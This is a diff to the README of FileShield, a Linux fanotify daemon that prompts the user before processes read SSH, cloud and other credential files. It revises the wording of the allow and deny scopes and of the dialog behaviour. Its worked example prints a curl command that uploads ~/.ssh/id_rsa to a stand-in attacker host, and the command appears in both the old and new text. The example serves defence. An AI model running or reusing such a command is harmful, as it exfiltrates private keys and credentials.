@@ -10,7 +10,7 @@
 
 - **True pre-access blocking**: The kernel suspends the `open()` syscall until FileShield responds — no race condition.
 - **Interactive prompts**: Two-stage `kdialog` popups ask for permission before any data is exposed; the dialog inherits your session's Qt theme, fonts and scaling.
-- **Scoped decisions**: _Allow Once_ is file-scoped with a `user_ttl`; _Allow Session_ lasts until you close the terminal; _Allow Always_ is a persistent per-file rule bound to the binary hash, call chain and exact command line. Matching deny scopes exist too.
+- **Scoped decisions**: _Allow Once_ is file-scoped with a `user_ttl`; _Allow Session_ is scoped to that binary and exact file for the lifetime of the shell session (optionally capped by `session_ttl`); _Allow Always_ is a persistent rule bound to the binary hash, call chain, exact file and exact command line. Matching deny scopes exist too.
 - **SRE secrets covered by default**: AWS, kubeconfig, SSH keys, GCP, Azure, Vault token, Docker config, and more — out of the box.
 
 ---
@@ -201,7 +201,7 @@ debug = no
 When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/user/.ssh/id_rsa`:
 
 1. The kernel suspends the `open()` call.
-2. A two-stage popup appears. Stage 1:
+2. A two-stage popup appears. Stage 1 shows what is known about the access; its buttons are **Allow Once**, **Allow…** and **Deny…**:
 
    ```text
    Process curl (PID 4521, parent: bash (PID 4518)) wants to read:
@@ -210,28 +210,35 @@ When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/
    Binary:   /tmp/curl
    Command:  curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
 
-   • Allow Once — this file, for the configured user_ttl
+   • Allow Once — this file for 300 seconds (this process)
    • Allow      — choose session or permanent access
-   • Deny       — choose a session or permanent block
+   • Deny       — choose this time, session or permanent
    ```
 
-   Clicking **Allow** opens stage 2 (grants):
+   Choosing **Allow…** opens stage 2 (grants) with the same binary, command and
+   file repeated, so the scope decision never loses context. Its buttons are
+   **Allow Session**, **Allow Always** and **Deny**:
 
    ```text
    Allow access to:
    /home/user/.ssh/id_rsa
 
-   • Allow Session — this file until this session closes
-   • Allow Always  — this file permanently (re-prompts if the binary changes)
-   • Cancel        — deny this time
+   Requested by: curl (PID 4521)
+   Binary:   /tmp/curl
+   Command:  curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
+
+   • Allow Session — this binary and file until this session ends
+   • Allow Always  — this file, this command and its call chain, permanently
+   • Deny          — deny this time
    ```
 
-   Clicking **Deny** opens the matching deny stage: _Deny Session / Deny Always / Deny_.
+   Choosing **Deny…** opens the matching deny stage (**Deny Session**,
+   **Deny Always**, **Deny Once**).
 
-3. **Deny** → `FAN_DENY` — the process receives `EPERM`, the file is never read.
-4. **Allow Once** → `FAN_ALLOW` — access is granted and cached for this process and this exact file for `user_ttl` seconds.
-5. **Allow Session** → `FAN_ALLOW` — any process of that binary in this shell session may read that one file until the terminal closes (or `session_ttl` elapses, whichever comes first).
-6. **Allow Always** → `FAN_ALLOW` — a persistent, file- and command-scoped runtime allowlist entry is created (see below).
+3. **Deny Once** → `FAN_DENY` — the process receives `EPERM`, the file is never read.
+4. **Allow once** → `FAN_ALLOW` — access is granted and cached for this process and this exact file for `user_ttl` seconds.
+5. **Allow session** → `FAN_ALLOW` — this binary may read this exact file in this shell session until the session leader exits (or `session_ttl` elapses, whichever comes first). Other binaries and other files still prompt.
+6. **Allow always** → `FAN_ALLOW` — a persistent rule bound to the binary hash, call chain, exact file and exact command line is created (see below).
 
 ### Decision Scopes
 
@@ -242,7 +249,7 @@ When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/
 | Allow Always  | binary SHA-512 + call chain + exact file + exact command line | until removed                                                 | `runtime-allowlist.json` |
 | Deny Session  | same key shape as Allow Session                               | same as Allow Session                                         | no                       |
 | Deny Always   | same key shape as Allow Always                                | until removed                                                 | `runtime-denylist.json`  |
-| Deny          | —                                                             | this attempt only                                             | no                       |
+| Deny          | —                                                             | this attempt (rapid retries of the same open are denied for ~2 s) | no                       |
 
 Denials are always checked before grants, so a config, session or permanent denial can never be bypassed by an allow rule or a cached _Allow Once_. The decision order is: config denylist → session deny → runtime deny → file cache → session allow → runtime allow → config allowlist → dialog. An open that reaches a protected inode through a path outside every protected prefix (a hard link) never takes a grant from those lists: it always shows the dialog, so an approval for the original path cannot silently cover the link.
 
@@ -481,7 +488,7 @@ Builds and runs `tests/bench_hotpath.c`, the microbenchmarks for the per-event h
 
 - **No popups appear?** The daemon auto-detects the Wayland socket and D-Bus address under `/run/user/<uid>/`. Verify the desktop session is active and `kdialog` is installed (`apt install kdialog` / `dnf install kdialog`). if kdialog is missing or fails, access is denied (fail closed).
 - **Dialog does not match your theme?** The daemon runs as root with a bare environment, so FileShield forwards a whitelist of your session's appearance variables (`XDG_CURRENT_DESKTOP`, `KDE_FULL_SESSION`/`KDE_SESSION_VERSION`, `QT_QPA_PLATFORMTHEME`, `QT_STYLE_OVERRIDE`, scale factors, locale, cursor) into the dialog child after it drops to your user. On Plasma/KDE this makes kdialog use your color scheme and fonts automatically. On other desktops the dialog follows the system theme only if a Qt platform theme integration is installed (e.g. `qgnomeplatform`/adwaita-qt for GNOME, `qt6ct`); without one Qt falls back to its default light theme.
-- **Dialog behavior on failure**: timeouts, exec failures and unexpected kdialog exit codes deny the access. On the stage-2 Allow dialog, `Allow Always` sits on the No button (kdialog exit code 1), which kdialog also returns for some runtime errors — this is a documented, accepted trade-off; _Allow Session_ remains available and exec failures/timeouts always fail closed.
+- **Dialog behavior on failure**: timeouts, exec failures and Cancel/window close deny the access. On the stage-2 Allow dialog, `Allow Always` sits on the No button (kdialog exit code 1), which kdialog also returns for some runtime errors — a documented, accepted trade-off; `Allow Session` remains on Yes, and timeouts/exec failures always fail closed.
 - **Access blocked for a trusted process?** Add it to `[allowlist]` in `/etc/fileshield.conf` and run `sudo systemctl reload fileshield`. Check `journalctl -u fileshield -n 20` to confirm the reload succeeded.
 - **Daemon fails to start?** Confirm the service runs as root — `fanotify_init` requires `CAP_SYS_ADMIN`. Check `journalctl -u fileshield -p err` for the exact error.
 - **A path is watched but events are not firing?** Verify the mark was added successfully (`journalctl -t fileshield | grep "mark added"`). Paths on NFS/CIFS mounts or inside containers are not supported by fanotify.
